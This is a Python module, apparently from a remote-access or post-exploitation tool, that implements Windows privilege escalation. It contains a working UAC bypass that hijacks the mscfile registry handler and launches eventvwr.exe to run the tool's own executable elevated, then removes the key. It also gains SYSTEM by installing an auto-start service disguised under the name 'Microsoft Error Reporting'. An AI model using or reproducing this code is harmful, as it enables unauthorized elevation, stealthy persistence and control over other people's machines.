from misc import misc
from execute import execute
import logging
import getpass
from common import *

class Privilege_Escalation:
	"""
	Functions related to escalating privileges.
	"""
	def __init__(self):
		self.shell = None
		
	@windows_only
	def bypass_uac(self):
		logging.info("Attempting to bypass UAC.")
		if misc.isadmin():
			logging.debug("UAC bypass failed: Process already has admin privileges.")
			return "[*]You already have admin privileges!" # Check your privilege!
		 
		if not misc.is_user_in_group(misc.name_of_admin_group(), getpass.getuser()):
			logging.debug("UAC bypass failed: Current user is not part of admin group.")
			return "[-]Current user is not part of admin group."
		 
		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
			return "[-]UAC is disabled or notification policy is set to 'Always'"
			
		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
		self.shell.transport.signal_channel.signal("NEW_SESH")
		os.startfile("eventvwr.exe") # Eventvwr is a program that autoelevates and also runs a program specified in a certain registry key.
		time.sleep(2)
		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		
		return "BG_NEW_SESH"
		
	@windows_only
	def create_service(self, path, name):
		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto") != 0: # BROKEN, FIX!!!!!!!!!
			return False
		if execute.execute_shell_command("sc start "+name) != 0: # TODO: check why this is broken
			return False											# Broken cuz we're not a proper service
		return True
		
	@windows_only
	def remove_service(self, name):
		execute.execute_shell_command("sc delete "+name)
		
	@windows_only
	def get_system(self):
		if not misc.isadmin(): return "[-]You need admin privileges to get system." # Check your privilege! (That was funny the first time)
		self.create_service(os.path.abspath(sys.executable), '"Microsoft Error Reporting"')
		return "BG_NEW_SESH"
		
privesc = Privilege_Escalation()